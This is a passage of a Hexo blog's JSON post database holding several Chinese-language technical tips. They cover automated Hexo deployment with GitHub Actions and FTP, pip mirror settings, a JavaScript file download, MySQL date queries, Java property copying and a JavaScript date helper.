title=\"本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考Hexo安装配置并托管至github\"></a>本文要求已经对Hexo有一点了解，并且知道怎么托管hexo到github，如果您刚接触Hexo，可以参考<a href=\"https://blog.ctftools.com/2017/12/post233/\">Hexo安装配置并托管至github</a></h3><h3 id=\"如果不想依赖github，可以参考这套自建方案centos下hexo-svn-jenkins实现博客自动部署、svn提交后jenkins自动部署\"><a href=\"#如果不想依赖github，可以参考这套自建方案centos下hexo-svn-jenkins实现博客自动部署、svn提交后jenkins自动部署\" class=\"headerlink\" title=\"如果不想依赖github，可以参考这套自建方案centos下hexo + svn + jenkins实现博客自动部署、svn提交后jenkins自动部署\"></a>如果不想依赖github，可以参考这套自建方案<a href=\"https://blog.ctftools.com/2020/11/post249/\">centos下hexo + svn + jenkins实现博客自动部署</a>、<a href=\"https://blog.ctftools.com/2020/11/newpost-1/\">svn提交后jenkins自动部署</a></h3>","more":"<h2 id=\"一、新建github私有仓库保存hexo源码\"><a href=\"#一、新建github私有仓库保存hexo源码\" class=\"headerlink\" title=\"一、新建github私有仓库保存hexo源码\"></a>一、新建github私有仓库保存hexo源码</h2><p>不细说</p>\n<h2 id=\"二、Github-Actions配置\"><a href=\"#二、Github-Actions配置\" class=\"headerlink\" title=\"二、Github Actions配置\"></a>二、Github Actions配置</h2><h3 id=\"2-1-配置仓库私钥\"><a href=\"#2-1-配置仓库私钥\" class=\"headerlink\" title=\"2.1 配置仓库私钥\"></a>2.1 配置仓库私钥</h3><p>进入存放源码的私有仓库，点击<code>Settings</code>-<code>Secrets</code>，<code>New repository secret</code>，新建名为<code>HEXO_DEPLOY_PRIVATE_KEY</code>的私钥，值为你的私钥，通常可以在<code>\\.ssh\\id_rsa</code>中的获取到。</p>\n<h3 id=\"2-2-配置Actions\"><a href=\"#2-2-配置Actions\" class=\"headerlink\" title=\"2.2 配置Actions\"></a>2.2 配置Actions</h3><p>点击私有仓库<code>Actions</code>-<code>New workflow</code>-<code>set up a workflow yourself</code>，内容编辑如下，把其中的<code>名字</code>和<code>邮箱</code>替换成你自己的</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># workflow name</span></span><br><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Hexo博客持续集成</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># master branch on push, auto run</span></span><br><span class=\"line\"><span class=\"attr\">on:</span> </span><br><span class=\"line\"><span class=\"attr\">  push:</span></span><br><span class=\"line\"><span class=\"attr\">    branches:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">master</span></span><br><span class=\"line\">      </span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\"><span class=\"attr\">  build:</span> </span><br><span class=\"line\"><span class=\"attr\">    runs-on:</span> <span class=\"string\">ubuntu-latest</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">    steps:</span></span><br><span class=\"line\">    <span class=\"comment\"># check it to your workflow can access it</span></span><br><span class=\"line\">    <span class=\"comment\"># from: https://github.com/actions/checkout</span></span><br><span class=\"line\"><span class=\"attr\">    - name:</span> <span class=\"string\">检出仓库代码</span></span><br><span class=\"line\"><span class=\"attr\">      uses:</span> <span class=\"string\">actions/checkout@master</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># from: https://github.com/actions/setup-node</span></span><br><span class=\"line\"><span class=\"attr\">    - name:</span> <span class=\"string\">安装Node.js</span> <span class=\"number\">11.</span><span class=\"string\">x</span> </span><br><span class=\"line\"><span class=\"attr\">      uses:</span> <span class=\"string\">actions/setup-node@master</span></span><br><span class=\"line\"><span class=\"attr\">      with:</span></span><br><span class=\"line\"><span class=\"attr\">        node-version:</span> <span class=\"string\">\"11.x\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">    - name:</span> <span class=\"string\">安装Hexo依赖</span></span><br><span class=\"line\"><span class=\"attr\">      run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">        npm install hexo-cli -g</span></span><br><span class=\"line\"><span class=\"string\">        npm install</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    - name:</span> <span class=\"string\">配置部署私钥</span></span><br><span class=\"line\"><span class=\"attr\">      env:</span></span><br><span class=\"line\"><span class=\"attr\">        HEXO_DEPLOY_PRIVATE_KEY:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.HEXO_DEPLOY_PRIVATE_KEY</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">      run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">        mkdir -p ~/.ssh/</span></span><br><span class=\"line\"><span class=\"string\">        echo \"$HEXO_DEPLOY_PRIVATE_KEY\" &gt; ~/.ssh/id_rsa</span></span><br><span class=\"line\"><span class=\"string\">        chmod 600 ~/.ssh/id_rsa</span></span><br><span class=\"line\"><span class=\"string\">        ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    - name:</span> <span class=\"string\">配置GIT信息</span></span><br><span class=\"line\"><span class=\"attr\">      run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">        git config --global user.name '名字'</span></span><br><span class=\"line\"><span class=\"string\">        git config --global user.email '邮箱'</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span><span class=\"attr\">    - name:</span> <span class=\"string\">部署Hexo到Github</span></span><br><span class=\"line\"><span class=\"attr\">      run:</span> <span class=\"string\">|</span></span><br><span class=\"line\"><span class=\"string\">        hexo clean</span></span><br><span class=\"line\"><span class=\"string\">        hexo generate</span></span><br><span class=\"line\"><span class=\"string\">        hexo deploy</span></span><br></pre></td></tr></table></figure>\n<p>完成后点击右上角<code>Start commit</code>-<code>Commit new ile</code>，这个Actions是提交代码后触发，快去试试吧，提交后约需要1分钟部署，之后就能在你托管的页面看到最新的博客了</p>\n<p>如果需要通过ftp传到国内云加速访问，可以在上边的内容紧接着加上以下内容，具体配置参考<a href=\"https://github.com/SamKirkland/FTP-Deploy-Action\" target=\"_blank\" rel=\"noopener\">FTP-Deploy-Action</a></p>\n<p><strong>ftp连接国内会比较慢，尤其是第一次，因为要全量上传，之后增量上传会快很多。</strong></p>\n<p>还有<strong>注意服务器要放行FTP被动模式端口</strong>，否则能创建文件夹，但不能上传文件。被动模式端口可能是30000-40000，或者3000-4000，这个是可以在你的FTP服务端软件配置的，类似于<code>PassivePortRange 39000 40000</code>。</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">- name:</span> <span class=\"string\">部署Hexo到云服务器</span></span><br><span class=\"line\"><span class=\"attr\">  uses:</span> <span class=\"string\">SamKirkland/FTP-Deploy-Action@4.1.0</span></span><br><span class=\"line\"><span class=\"attr\">  with:</span></span><br><span class=\"line\"><span class=\"attr\">    server:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.FTP_SERVER</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    username:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.FTP_USERNAME</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    password:</span> <span class=\"string\">$&#123;&#123;</span> <span class=\"string\">secrets.FTP_PASSWORD</span> <span class=\"string\">&#125;&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    local-dir:</span> <span class=\"string\">./public/</span></span><br></pre></td></tr></table></figure>\n<p>注意这需要在私有仓库，<code>Settings</code>-<code>Secrets</code>，<code>New repository secret</code>，新建相应secret，方法与上边新建<code>HEXO_DEPLOY_PRIVATE_KEY</code>一样，<code>FTP_SERVER</code>不用带<code>ftp://</code>之类的，直接填入<code>ftp.xxx.com</code>即可。</p>\n<p>参考文章：<a href=\"https://blog.csdn.net/u012208219/article/details/106883054#comments_15417337\" target=\"_blank\" rel=\"noopener\">利用GitHub+Actions自动部署Hexo博客</a>，<a href=\"https://moeci.com/posts/github-actions-hexo-ftp/\" target=\"_blank\" rel=\"noopener\">GitHub Actions 自动发布Hexo 并通过 FTP上传 到阿里云ECS</a></p>"},{"title":"testimg","date":"2021-07-27T06:25:55.000Z","_content":"\n![cat](newpost-19/cat.png)\n\n","source":"_posts/newpost-19.md","raw":"---\ntitle: testimg\ndate: 2021-07-27 14:25:55\ntags: 测试\n---\n\n![cat](newpost-19/cat.png)\n\n","slug":"newpost-19","published":1,"updated":"2021-07-27T07:14:40.923Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rcz000jq0szn8zbqdaz","content":"<img src=\"/2021/07/newpost-19/cat.png\" title=\"cat\">\n","site":{"data":{}},"excerpt":"","more":"<img src=\"/2021/07/newpost-19/cat.png\" title=\"cat\">\n"},{"title":"python - pip换源","date":"2020-11-16T09:06:23.000Z","_content":"\n* windows直接在user目录中创建一个pip目录，如：C:\\Users\\xx\\pip，新建文件pip.ini，内容如下\n\n```ini\n[global]\nindex-url = https://mirrors.aliyun.com/pypi/simple/\n```\n\n<!--more-->\n\nlinux修改 ~/.pip/pip.conf (没有就创建一个)， 内容同上\n\n其他源\n\n* 中国科技大学 `http://pypi.mirrors.ustc.edu.cn/simple/`\n\n* 豆瓣 `http://pypi.douban.com/simple/`\n\n* 清华 `https://pypi.tuna.tsinghua.edu.cn/simple/`\n\n* 中国科学技术大学`http://pypi.mirrors.ustc.edu.cn/simple/`","source":"_posts/newpost-2.md","raw":"---\ntitle: python - pip换源\ndate: 2020-11-16 17:06:23\ntags: [运维,Python]\n---\n\n* windows直接在user目录中创建一个pip目录，如：C:\\Users\\xx\\pip，新建文件pip.ini，内容如下\n\n```ini\n[global]\nindex-url = https://mirrors.aliyun.com/pypi/simple/\n```\n\n<!--more-->\n\nlinux修改 ~/.pip/pip.conf (没有就创建一个)， 内容同上\n\n其他源\n\n* 中国科技大学 `http://pypi.mirrors.ustc.edu.cn/simple/`\n\n* 豆瓣 `http://pypi.douban.com/simple/`\n\n* 清华 `https://pypi.tuna.tsinghua.edu.cn/simple/`\n\n* 中国科学技术大学`http://pypi.mirrors.ustc.edu.cn/simple/`","slug":"newpost-2","published":1,"updated":"2020-12-07T02:08:56.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd0000lq0szptxq91wv","content":"<ul>\n<li>windows直接在user目录中创建一个pip目录，如：C:\\Users\\xx\\pip，新建文件pip.ini，内容如下</li>\n</ul>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[global]</span></span><br><span class=\"line\"><span class=\"attr\">index-url</span> = https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>linux修改 ~/.pip/pip.conf (没有就创建一个)， 内容同上</p>\n<p>其他源</p>\n<ul>\n<li><p>中国科技大学 <code>http://pypi.mirrors.ustc.edu.cn/simple/</code></p>\n</li>\n<li><p>豆瓣 <code>http://pypi.douban.com/simple/</code></p>\n</li>\n<li><p>清华 <code>https://pypi.tuna.tsinghua.edu.cn/simple/</code></p>\n</li>\n<li><p>中国科学技术大学<code>http://pypi.mirrors.ustc.edu.cn/simple/</code></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<ul>\n<li>windows直接在user目录中创建一个pip目录，如：C:\\Users\\xx\\pip，新建文件pip.ini，内容如下</li>\n</ul>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[global]</span></span><br><span class=\"line\"><span class=\"attr\">index-url</span> = https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>","more":"<p>linux修改 ~/.pip/pip.conf (没有就创建一个)， 内容同上</p>\n<p>其他源</p>\n<ul>\n<li><p>中国科技大学 <code>http://pypi.mirrors.ustc.edu.cn/simple/</code></p>\n</li>\n<li><p>豆瓣 <code>http://pypi.douban.com/simple/</code></p>\n</li>\n<li><p>清华 <code>https://pypi.tuna.tsinghua.edu.cn/simple/</code></p>\n</li>\n<li><p>中国科学技术大学<code>http://pypi.mirrors.ustc.edu.cn/simple/</code></p>\n</li>\n</ul>"},{"title":"前端下载二进制文件","date":"2020-11-30T01:28:30.000Z","_content":"\n假设你从后台获取到的二进制数据为`res`，则\n\n<!--more-->\n\n```javascript\nvar eleLink = document.createElement('a');\neleLink.download = '导出.xls';\neleLink.style.display = 'none';\n// 二进制内容转变成blob地址\nvar blob = new Blob([res]);\neleLink.href = URL.createObjectURL(blob);\n// 触发点击\ndocument.body.appendChild(eleLink);\neleLink.click();\n// 然后移除\ndocument.body.removeChild(eleLink);\n```\n\n如果发现乱码，可能是请求头问题，在请求头部加上\n\n```javascript\nresponseType: 'arraybuffer'\n```\n\n就能指定返回为二进制流","source":"_posts/newpost-4.md","raw":"---\ntitle: 前端下载二进制文件\ndate: 2020-11-30 09:28:30\ntags: 前端\n---\n\n假设你从后台获取到的二进制数据为`res`，则\n\n<!--more-->\n\n```javascript\nvar eleLink = document.createElement('a');\neleLink.download = '导出.xls';\neleLink.style.display = 'none';\n// 二进制内容转变成blob地址\nvar blob = new Blob([res]);\neleLink.href = URL.createObjectURL(blob);\n// 触发点击\ndocument.body.appendChild(eleLink);\neleLink.click();\n// 然后移除\ndocument.body.removeChild(eleLink);\n```\n\n如果发现乱码，可能是请求头问题，在请求头部加上\n\n```javascript\nresponseType: 'arraybuffer'\n```\n\n就能指定返回为二进制流","slug":"newpost-4","published":1,"updated":"2020-12-07T02:03:13.777Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd1000oq0szdsm86mcl","content":"<p>假设你从后台获取到的二进制数据为<code>res</code>，则</p>\n<a id=\"more\"></a>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> eleLink = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'a'</span>);</span><br><span class=\"line\">eleLink.download = <span class=\"string\">'导出.xls'</span>;</span><br><span class=\"line\">eleLink.style.display = <span class=\"string\">'none'</span>;</span><br><span class=\"line\"><span class=\"comment\">// 二进制内容转变成blob地址</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> blob = <span class=\"keyword\">new</span> Blob([res]);</span><br><span class=\"line\">eleLink.href = URL.createObjectURL(blob);</span><br><span class=\"line\"><span class=\"comment\">// 触发点击</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(eleLink);</span><br><span class=\"line\">eleLink.click();</span><br><span class=\"line\"><span class=\"comment\">// 然后移除</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.removeChild(eleLink);</span><br></pre></td></tr></table></figure>\n<p>如果发现乱码，可能是请求头问题，在请求头部加上</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">responseType: <span class=\"string\">'arraybuffer'</span></span><br></pre></td></tr></table></figure>\n<p>就能指定返回为二进制流</p>\n","site":{"data":{}},"excerpt":"<p>假设你从后台获取到的二进制数据为<code>res</code>，则</p>","more":"<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> eleLink = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'a'</span>);</span><br><span class=\"line\">eleLink.download = <span class=\"string\">'导出.xls'</span>;</span><br><span class=\"line\">eleLink.style.display = <span class=\"string\">'none'</span>;</span><br><span class=\"line\"><span class=\"comment\">// 二进制内容转变成blob地址</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> blob = <span class=\"keyword\">new</span> Blob([res]);</span><br><span class=\"line\">eleLink.href = URL.createObjectURL(blob);</span><br><span class=\"line\"><span class=\"comment\">// 触发点击</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(eleLink);</span><br><span class=\"line\">eleLink.click();</span><br><span class=\"line\"><span class=\"comment\">// 然后移除</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.removeChild(eleLink);</span><br></pre></td></tr></table></figure>\n<p>如果发现乱码，可能是请求头问题，在请求头部加上</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">responseType: <span class=\"string\">'arraybuffer'</span></span><br></pre></td></tr></table></figure>\n<p>就能指定返回为二进制流</p>"},{"title":"mysql获取最近一段时间数据","date":"2020-11-26T08:25:56.000Z","_content":"\n* 获取最近七天，其中`CREATE_TIME`改为实际表中存储时间的字段\n\n```mysql\nselect count(id) from table where date_sub(curdate(), interval 7 day) <= date(CREATE_TIME)\n```\n\n<!--more-->\n\n* 获取最近半年\n\n```mysql\nselect count(id) from table where date_sub(curdate(), interval 6 month) <= date(CREATE_TIME)\n```\n\n* 获取最近一年\n\n```mysql\nselect count(id) from table where date_sub(curdate(), interval 1 year) <= date(CREATE_TIME)\n```\n\n* 获取当月\n\n```mysql\nselect count(id) from table where DATE_FORMAT(NOW(),'%Y-%m') == DATE_FORMAT(CREATE_TIME,'%Y-%m')\n```\n","source":"_posts/newpost-3.md","raw":"---\ntitle: mysql获取最近一段时间数据\ndate: 2020-11-26 16:25:56\ntags: [编程,MySQL]\n---\n\n* 获取最近七天，其中`CREATE_TIME`改为实际表中存储时间的字段\n\n```mysql\nselect count(id) from table where date_sub(curdate(), interval 7 day) <= date(CREATE_TIME)\n```\n\n<!--more-->\n\n* 获取最近半年\n\n```mysql\nselect count(id) from table where date_sub(curdate(), interval 6 month) <= date(CREATE_TIME)\n```\n\n* 获取最近一年\n\n```mysql\nselect count(id) from table where date_sub(curdate(), interval 1 year) <= date(CREATE_TIME)\n```\n\n* 获取当月\n\n```mysql\nselect count(id) from table where DATE_FORMAT(NOW(),'%Y-%m') == DATE_FORMAT(CREATE_TIME,'%Y-%m')\n```\n","slug":"newpost-3","published":1,"updated":"2021-04-12T07:23:41.302Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd2000qq0sz9g7wgbc7","content":"<ul>\n<li>获取最近七天，其中<code>CREATE_TIME</code>改为实际表中存储时间的字段</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(id) from table where date_sub(curdate(), interval 7 day) &lt;= date(CREATE_TIME)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<ul>\n<li>获取最近半年</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(id) from table where date_sub(curdate(), interval 6 month) &lt;= date(CREATE_TIME)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>获取最近一年</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(id) from table where date_sub(curdate(), interval 1 year) &lt;= date(CREATE_TIME)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>获取当月</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(id) from table where DATE_FORMAT(NOW(),&apos;%Y-%m&apos;) == DATE_FORMAT(CREATE_TIME,&apos;%Y-%m&apos;)</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<ul>\n<li>获取最近七天，其中<code>CREATE_TIME</code>改为实际表中存储时间的字段</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(id) from table where date_sub(curdate(), interval 7 day) &lt;= date(CREATE_TIME)</span><br></pre></td></tr></table></figure>","more":"<ul>\n<li>获取最近半年</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(id) from table where date_sub(curdate(), interval 6 month) &lt;= date(CREATE_TIME)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>获取最近一年</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(id) from table where date_sub(curdate(), interval 1 year) &lt;= date(CREATE_TIME)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>获取当月</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(id) from table where DATE_FORMAT(NOW(),&apos;%Y-%m&apos;) == DATE_FORMAT(CREATE_TIME,&apos;%Y-%m&apos;)</span><br></pre></td></tr></table></figure>"},{"title":"java复制不同实体类中相同的字段","date":"2020-12-03T09:50:16.000Z","_content":"\n用下边的方法就能实现，其中`source`为复制源，`target`为复制目标。\n\n```java\nimport org.springframework.beans.BeanUtils;\n\nBeanUtils.copyProperties(source, target);\n```\n\n\n\n","source":"_posts/newpost-5.md","raw":"---\ntitle: java复制不同实体类中相同的字段\ndate: 2020-12-03 17:50:16\ntags: [编程,Java]\n---\n\n用下边的方法就能实现，其中`source`为复制源，`target`为复制目标。\n\n```java\nimport org.springframework.beans.BeanUtils;\n\nBeanUtils.copyProperties(source, target);\n```\n\n\n\n","slug":"newpost-5","published":1,"updated":"2020-12-07T02:09:14.868Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd3000tq0szbcxjsadg","content":"<p>用下边的方法就能实现，其中<code>source</code>为复制源，<code>target</code>为复制目标。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.BeanUtils;</span><br><span class=\"line\"></span><br><span class=\"line\">BeanUtils.copyProperties(source, target);</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>用下边的方法就能实现，其中<code>source</code>为复制源，<code>target</code>为复制目标。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.BeanUtils;</span><br><span class=\"line\"></span><br><span class=\"line\">BeanUtils.copyProperties(source, target);</span><br></pre></td></tr></table></figure>\n"},{"title":"JavaScript获取当前周或下n周的周n的日期","date":"2020-12-15T09:32:57.000Z","_content":"\n调用方法`getDate(cur_m, day_m)`\n\n<!--more-->\n\n```js\nfunction getDate(cur_m, day_m) {\n  // cur_m，0-本周，1-下周，2-下下周...\n  // day_m，1-周一，2-周二...7-周日\n  var date = new Date();\n  var day = date.getDay() || 7;\n  date = new Date(date.getFullYear(), date.getMonth(), date.getDate() - day + day_m + 7 * cur_m);\n  var y = date.getFullYear();\n  var m = date.getMonth() + 1;\n  m = m < 10 ? '0' + m : m;\n  var d = date.getDate();\n  d = d < 10 ? ('0' + d) : d;\n  return y + '-' + m + '-' + d;\n}\n```\n\n","source":"_posts/newpost-6.md","raw":"---\ntitle: JavaScript获取当前周或下n周的周n的日期\ndate: 2020-12-15 17:32:57\ntags: [JavaScript,前端]\n---\n\n调用方法`getDate(cur_m, day_m)`\n\n<!--more-->\n\n```js\nfunction getDate(cur_m, day_m) {\n  // cur_m，0-本周，1-下周，2-下下周...\n  // day_m，1-周一，2-周二...7-周日\n  var date = new Date();\n  var day = date.getDay() || 7;\n  date = new Date(date.getFullYear(), date.getMonth(), date.getDate() - day + day_m + 7 * cur_m);\n  var y = date.getFullYear();\n  var m = date.getMonth() + 1;\n  m = m < 10 ? '0' + m : m;\n  var d = date.getDate();\n  d = d < 10 ? ('0' + d) : d;\n  return y + '-' + m + '-' + d;\n}\n```\n\n","slug":"newpost-6","published":1,"updated":"2020-12-15T10:06:28.064Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rd4000vq0szyezti5p8","content":"<p>调用方法<code>getDate(cur_m, day_m)</code></p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getDate</span>(<span class=\"params\">cur_m, day_m</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// cur_m，0-本周，1-下周，2-下下周...</span></span><br><span class=\"line\">  <span class=\"comment\">// day_m，1-周一，2-周二...7-周日</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>();</span><br><span class=\"line\">  <span class=\"keyword\">var</span> day = date.getDay() || <span class=\"number\">7</span>;</span><br><span class=\"line\">  date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(date.getFullYear(), date.getMonth(), date.getDate() - day + day_m + <span class=\"number\">7</span> * cur_m);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> y = date.getFullYear();</span><br><span class=\"line\">  <span class=\"keyword\">var</span> m = date.getMonth() + <span class=\"number\">1</span>;</span><br><span class=\"line\">  m = m &lt; <span class=\"number\">10</span> ? <span class=\"string\">'0'</span> + m : m;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> d = date.getDate();</span><br><span class=\"line\">  d = d &lt; <span class=\"number\">10</span> ? (<span class=\"string\">'0'</span> + d) : d;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> y + <span class=\"string\">'-'</span> + m + <span class=\"string\">'-'</span> + d;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>调用方法<code>getDate(cur_m, day_m)</code></p>","more":"<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span 